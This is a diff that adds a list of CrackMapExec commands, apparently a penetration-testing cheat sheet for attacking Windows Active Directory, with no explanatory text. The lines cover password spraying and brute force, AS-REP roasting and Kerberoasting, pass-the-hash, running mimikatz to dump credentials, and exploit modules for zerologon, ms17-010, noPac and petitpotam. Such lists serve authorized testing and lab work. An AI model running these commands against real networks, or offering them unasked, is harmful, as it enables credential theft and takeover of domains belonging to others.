@@ -1,3 +1,24 @@
+crackmapexec smb --list-modules
+crackmapexec ldap "$DC_HOST" -d "$DOMAIN" -u "$USER" -p "$PASSWORD" -M maq
+crackmapexec ldap "$DC_HOST" -d "$DOMAIN" -u "$USER" -p "$PASSWORD"
+crackmapexec ldap "$DC_HOST" -d "$DOMAIN" -u "$USER" -p "$PASSWORD" --asreproast ASREProastables.txt --kdcHost "$DC_HOST"
+crackmapexec ldap "$DC_HOST" -d "$DOMAIN" -u "$USER" -p "$PASSWORD" --kerberoasting Kerberoastables.txt --kdcHost "$DC_HOST"
+crackmapexec smb "$TARGET" --continue-on-success --no-bruteforce -u users.txt -p passwords.txt
+crackmapexec smb "$TARGET" --continue-on-success -u users.txt -p passwords.txt
+crackmapexec smb "$TARGET" --local-auth -u "$USER" -H "$NT_HASH" -M enum_avproducts
+crackmapexec smb "$TARGET" --local-auth -u "$USER" -H "$NT_HASH" -M mimikatz
+crackmapexec smb "$TARGET" -u '' -p '' --pass-pol
+crackmapexec smb 192.168.56.0/24 --gen-relay-list smb_targets.txt
+crackmapexec smb 192.168.56.0/24 --local-auth -u '' -p ''
+crackmapexec smb 192.168.56.0/24 -u "$USER" -p "$PASSWORD" --loggedon-users
+crackmapexec smb 192.168.56.0/24 -u "$USER" -p "$PASSWORD" --sessions
+crackmapexec smb 192.168.56.0/24 -u "$USER" -p "$PASSWORD" --shares
+crackmapexec smb 192.168.56.0/24 -u '' -p '' --shares
+crackmapexec smb "$IP" -u "$USER" -p "$PASSWORD" -M noPac
+crackmapexec smb "$IP" -u "$USER" -p "$PASSWORD" -M petitpotam
+crackmapexec smb "$IP" -u '' -p '' -M zerologon
+crackmapexec smb "$IP" -u '' -p '' -M ms17-010
+crackmapexec smb "$IP" -u '' -p '' -M ioxidresolver
 cme smb --list-modules
 cme ldap "$DC_HOST" -d "$DOMAIN" -u "$USER" -p "$PASSWORD" -M maq
 cme ldap "$DC_HOST" -d "$DOMAIN" -u "$USER" -p "$PASSWORD"
